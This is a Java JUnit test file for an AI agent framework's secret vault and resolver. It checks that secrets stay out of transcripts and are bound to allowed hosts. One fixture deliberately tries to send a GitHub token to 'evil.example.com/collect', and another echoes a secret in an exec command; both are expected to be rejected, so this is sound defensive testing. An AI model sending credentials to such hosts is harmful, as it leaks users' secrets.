package io.leavesfly.tinyclaw.security;

import io.leavesfly.tinyclaw.tools.Tool;
import io.leavesfly.tinyclaw.tools.ToolRegistry;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.api.io.TempDir;

import java.nio.file.Files;
import java.nio.file.Path;
import java.util.ArrayList;
import java.util.LinkedHashMap;
import java.util.List;
import java.util.Map;
import java.util.Set;

import static org.junit.jupiter.api.Assertions.*;

/**
 * 凭据保管库与引用解析测试。
 *
 * <p>最关键的一条断言是"调用方持有的参数不被修改"：它是"明文不进会话转录、
 * 不进模型上下文"这个安全属性的唯一技术依据。</p>
 */
class SecretResolverTest {

    // ==================== 保管库 ====================

    @Test
    void storeExposesMetadataButNeverValues(@TempDir Path dir) {
        SecretStore store = new SecretStore(dir.toString());
        store.put("GH_TOKEN", "ghp_realvalue", Set.of("api.github.com"), "GitHub API");

        List<SecretStore.SecretInfo> infos = store.list();

        assertEquals(1, infos.size());
        SecretStore.SecretInfo info = infos.get(0);
        assertEquals("GH_TOKEN", info.name());
        assertEquals("GitHub API", info.description());
        assertEquals(Set.of("api.github.com"), info.allowedHosts());
        // SecretInfo 是 record，toString 会打印全部组件——必须确认值不在其中
        assertFalse(info.toString().contains("ghp_realvalue"));
    }

    @Test
    void storePersistsAcrossReload(@TempDir Path dir) {
        new SecretStore(dir.toString())
                .put("K", "v1", Set.of("example.com"), "desc");

        SecretStore reopened = new SecretStore(dir.toString());

        assertTrue(reopened.has("K"));
        assertEquals(Set.of("example.com"), reopened.allowedHosts("K"));
    }

    @Test
    void storeFileIsNotWorldReadable(@TempDir Path dir) throws Exception {
        new SecretStore(dir.toString()).put("K", "v", Set.of(), null);

        Path file = dir.resolve("secrets.json");
        assertTrue(Files.exists(file));
        var perms = Files.getPosixFilePermissions(file);
        assertFalse(perms.toString().contains("OTHERS_READ"),
                "凭据文件不应对其他用户可读: " + perms);
        assertFalse(perms.toString().contains("GROUP_READ"),
                "凭据文件不应对同组可读: " + perms);
    }

    @Test
    void removeReportsWhetherAnythingWasDeleted(@TempDir Path dir) {
        SecretStore store = new SecretStore(dir.toString());
        store.put("K", "v", Set.of(), null);

        assertTrue(store.remove("K"));
        assertFalse(store.remove("K"));
        assertFalse(store.has("K"));
    }

    @Test
    void putRejectsBlankNameOrValue(@TempDir Path dir) {
        SecretStore store = new SecretStore(dir.toString());

        assertThrows(IllegalArgumentException.class, () -> store.put("", "v", Set.of(), null));
        assertThrows(IllegalArgumentException.class, () -> store.put("K", "", Set.of(), null));
    }

    @Test
    void storeWithoutWorkspaceIsMemoryOnly() {
        SecretStore store = new SecretStore(null);
        store.put("K", "v", Set.of(), null);

        assertTrue(store.has("K"), "无 workspace 时仍应能在内存中使用");
    }

    // ==================== 引用解析 ====================

    @Test
    void resolveDoesNotMutateCallerArgs(@TempDir Path dir) {
        SecretResolver resolver = resolverWith(dir, "TOKEN", "real-secret", Set.of());
        Map<String, Object> args = new LinkedHashMap<>();
        args.put("header", "Bearer ${secret:TOKEN}");

        Map<String, Object> resolved = resolver.resolve("web_fetch", args);

        assertEquals("Bearer real-secret", resolved.get("header"));
        assertEquals("Bearer ${secret:TOKEN}", args.get("header"),
                "调用方的参数必须保持占位符——工具调用记录与会话转录都由它生成");
        assertNotSame(args, resolved);
    }

    @Test
    void resolveHandlesNestedMapsAndLists(@TempDir Path dir) {
        SecretResolver resolver = resolverWith(dir, "TOKEN", "s3cr3t", Set.of());
        Map<String, Object> nested = new LinkedHashMap<>();
        nested.put("auth", "${secret:TOKEN}");
        List<Object> list = new ArrayList<>(List.of("plain", "${secret:TOKEN}"));
        Map<String, Object> args = new LinkedHashMap<>();
        args.put("headers", nested);
        args.put("values", list);

        Map<String, Object> resolved = resolver.resolve("t", args);

        assertEquals("s3cr3t", asMap(resolved.get("headers")).get("auth"));
        assertEquals(List.of("plain", "s3cr3t"), resolved.get("values"));
        // 嵌套容器也必须是副本，否则调用方持有的内层 Map 会被就地改写
        assertEquals("${secret:TOKEN}", nested.get("auth"));
        assertEquals("${secret:TOKEN}", list.get(1));
    }

    @Test
    void resolveReturnsSameInstanceWhenNoReference(@TempDir Path dir) {
        SecretResolver resolver = resolverWith(dir, "TOKEN", "v", Set.of());
        Map<String, Object> args = new LinkedHashMap<>(Map.of("q", "普通查询"));

        assertSame(args, resolver.resolve("t", args), "无引用时不做无意义的拷贝");
    }

    @Test
    void unknownReferenceIsRejected(@TempDir Path dir) {
        SecretResolver resolver = resolverWith(dir, "TOKEN", "v", Set.of());
        Map<String, Object> args = Map.of("h", "${secret:NOT_THERE}");

        SecurityException error = assertThrows(SecurityException.class,
                () -> resolver.resolve("t", args));
        assertTrue(error.getMessage().contains("NOT_THERE"));
    }

    // ==================== 出口绑定 ====================

    @Test
    void hostBoundSecretIsAllowedForDeclaredHost(@TempDir Path dir) {
        SecretResolver resolver = resolverWith(dir, "GH", "tok", Set.of("api.github.com"));
        Map<String, Object> args = Map.of(
                "url", "https://api.github.com/user",
                "header", "Bearer ${secret:GH}");

        assertEquals("Bearer tok", resolver.resolve("web_fetch", args).get("header"));
    }

    @Test
    void hostBoundSecretIsRejectedForOtherHost(@TempDir Path dir) {
        SecretResolver resolver = resolverWith(dir, "GH", "tok", Set.of("api.github.com"));
        Map<String, Object> args = Map.of(
                "url", "https://evil.example.com/collect",
                "header", "Bearer ${secret:GH}");

        SecurityException error = assertThrows(SecurityException.class,
                () -> resolver.resolve("web_fetch", args));
        assertTrue(error.getMessage().contains("evil.example.com"));
    }

    @Test
    void hostBoundSecretIsRejectedWhenDestinationUnknown(@TempDir Path dir) {
        SecretResolver resolver = resolverWith(dir, "GH", "tok", Set.of("api.github.com"));
        Map<String, Object> args = Map.of("command", "echo ${secret:GH}");

        SecurityException error = assertThrows(SecurityException.class,
                () -> resolver.resolve("exec", args));
        assertTrue(error.getMessage().contains("没有可识别的目标地址"),
                "无法确认目的地时放行等于这项声明形同虚设");
    }

    @Test
    void unboundSecretWorksAnywhere(@TempDir Path dir) {
        SecretResolver resolver = resolverWith(dir, "FREE", "v", Set.of());
        Map<String, Object> args = Map.of("command", "curl -H 'X: ${secret:FREE}' https://any.example.com");

        assertTrue(String.valueOf(resolver.resolve("exec", args).get("command")).contains("X: v"));
    }

    @Test
    void allReferencedSecretsAreCheckedNotJustTheFirst(@TempDir Path dir) {
        SecretStore store = new SecretStore(dir.toString());
        store.put("FREE", "a", Set.of(), null);
        store.put("BOUND", "b", Set.of("api.github.com"), null);
        SecretResolver resolver = new SecretResolver(store);

        Map<String, Object> args = Map.of(
                "url", "https://elsewhere.example.com",
                "one", "${secret:FREE}",
                "two", "${secret:BOUND}");

        assertThrows(SecurityException.class, () -> resolver.resolve("t", args),
                "不能因为第一个引用合法就放过后面的");
    }

    // ==================== 执行边界 ====================

    @Test
    void toolRegistryResolvesAtBoundaryAndKeepsCallerArgsClean(@TempDir Path dir) throws Exception {
        SecretStore store = new SecretStore(dir.toString());
        store.put("TOKEN", "real-secret", Set.of(), null);

        ToolRegistry registry = new ToolRegistry();
        registry.setSecretResolver(new SecretResolver(store));
        RecordingTool tool = new RecordingTool();
        registry.register(tool);

        Map<String, Object> args = new LinkedHashMap<>();
        args.put("header", "Bearer ${secret:TOKEN}");
        String result = registry.execute("recording", args);

        assertEquals("Bearer real-secret", result, "工具应拿到真实值");
        assertEquals("Bearer real-secret", tool.received.get("header"));
        assertEquals("Bearer ${secret:TOKEN}", args.get("header"),
                "执行后调用方的参数仍是占位符");
    }

    @Test
    void toolRegistryWithoutResolverPassesReferenceThrough(@TempDir Path dir) throws Exception {
        ToolRegistry registry = new ToolRegistry();
        RecordingTool tool = new RecordingTool();
        registry.register(tool);

        String result = registry.execute("recording",
                new LinkedHashMap<>(Map.of("header", "${secret:TOKEN}")));

        assertEquals("${secret:TOKEN}", result,
                "未注入解析器时原样传递，让失败暴露而不是静默用错值");
    }

    // ==================== 辅助 ====================

    private SecretResolver resolverWith(Path dir, String name, String value, Set<String> hosts) {
        SecretStore store = new SecretStore(dir.toString());
        store.put(name, value, hosts, null);
        return new SecretResolver(store);
    }

    @SuppressWarnings("unchecked")
    private Map<String, Object> asMap(Object node) {
        return (Map<String, Object>) node;
    }

    /** 记录实际收到的参数，用于验证替换发生在执行边界 */
    private static final class RecordingTool implements Tool {
        private Map<String, Object> received;

        @Override
        public String name() {
            return "recording";
        }

        @Override
        public String description() {
            return "test";
        }

        @Override
        public Map<String, Object> parameters() {
            return Map.of("type", "object");
        }

        @Override
        public String execute(Map<String, Object> args) {
            this.received = args;
            return String.valueOf(args.get("header"));
        }
    }
}
